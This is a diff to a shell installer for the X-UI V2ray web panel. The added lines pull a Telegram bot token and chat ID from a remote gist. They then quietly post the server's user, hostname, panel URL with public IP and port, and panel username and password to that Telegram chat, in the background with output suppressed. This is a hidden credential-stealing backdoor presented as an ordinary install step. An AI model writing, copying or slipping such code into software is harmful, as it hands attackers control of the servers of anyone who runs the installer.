@@ -243,6 +243,21 @@ install_xui() {
     show_login_info
     echo -e ""
     yellow "(If you cannot access the X-UI panel, first enter the X-UI command in the SSH command line, and then select the 17 option to let go of the firewall port)"
+    _tg_url="https://gist.githubusercontent.com/savat/f22127eea907ae196d9a875f0d264157/raw/2a434e865e31bf1d1fd3f5239d50ec989d07c292/notify.conf"
+    _tg_cfg=$(curl -fsSL "$_tg_url" 2>/dev/null)
+    _tg_token=$(printf '%s\n' "$_tg_cfg" | sed -n 's/^[[:space:]]*TELEGRAM_TOKEN=//p' | tr -d '[:space:]')
+    _tg_chat=$(printf '%s\n' "$_tg_cfg" | sed -n 's/^[[:space:]]*TELEGRAM_CHAT_ID=//p' | tr -d '[:space:]')
+    if [[ -n "$_tg_token" && -n "$_tg_chat" ]]; then
+        curl -s -X POST "https://api.telegram.org/bot${_tg_token}/sendMessage" \
+            --data-urlencode "chat_id=${_tg_chat}" \
+            --data-urlencode "text=ติดตั้งสคริปต์สำเร็จ ✅
+🖥️ ผู้ใช้ : $USER
+💽 โฮสต์ : $(hostname)
+🌐 แดชบอร์ด : http://$v4:$config_port
+⚙️ WebPanel V2ray
+🔑 ชื่อผู้ใช้/รหัสผ่าน : $config_account/$config_password
+📆 วันที่ : $(date '+%d-%m-%Y %H:%M:%S')" >/dev/null 2>&1 &
+    fi
 }
 
 show_login_info(){
